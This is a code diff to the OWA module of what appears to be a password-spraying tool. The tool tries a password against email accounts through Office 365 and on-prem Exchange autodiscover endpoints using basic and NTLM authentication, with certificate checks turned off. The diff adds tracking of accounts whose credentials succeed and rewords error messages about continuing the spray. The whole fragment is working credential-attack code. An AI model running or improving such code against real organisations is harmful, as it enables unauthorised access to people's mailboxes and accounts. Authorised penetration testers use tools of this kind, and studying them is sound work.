@@ -43,9 +43,9 @@ class OWA:
             self.netbios_domain = self.get_owa_domain(self.autodiscover_url)
             self.log.info(print_good(f"Got internal domain name using OWA: {self.netbios_domain}"))
         except Exception as e:
-            self.log.error(print_bad(f"Error parsing internal domain name using OWA. This usually means OWA is being hosted on-prem at a custom URL."))
-            self.log.error("    Do some recon and pass the URL as the target :)\n")
-            self.log.error(print_bad(f"Full error: {e}"))
+            self.log.error(print_bad(f"Error parsing internal domain name using OWA. This usually means OWA is being hosted on-prem or the target has a hybrid AD deployment"))
+            self.log.error("    Do some recon and pass the custom OWA URL as the target if you really want the internal domain name, password spraying can still continue though :)\n")
+            self.log.error(print_bad(f"Full error: {e}\n"))
 
         #except Exception as e:
             #self.log.error(print_bad(f"Couldn't get domain from OWA autodiscover URL: {e}"))
@@ -91,6 +91,7 @@ class OWA:
         r = requests.get("https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml", auth=(email, self.password), verify=False)
         if r.status_code == 200:
             log.info(print_good(f"Found credentials: {email}:{self.password}"))
+            self.valid_accounts.add(email)
         else:
             log.info(print_bad(f"Authentication failed: {email}:{self.password} (Invalid credentials)"))
 
@@ -98,8 +99,9 @@ class OWA:
         log = logging.getLogger(f"auth_owa({email})")
 
         headers = {"Content-Type": "text/xml"}
-        r = requests.get(self.autodiscover_url, auth=HttpNtlmAuth(f'{self.netbios_domain}\\{email}', self.password), verify=False)
+        r = requests.get(self.autodiscover_url, auth=HttpNtlmAuth(email, self.password), verify=False)
         if r.status_code == 200:
             log.info(print_good(f"Found credentials: {email}:{self.password}"))
+            self.valid_accounts.add(email)
         else:
             log.info(print_bad(f"Authentication failed: {email}:{self.password} (Invalid credentials)"))
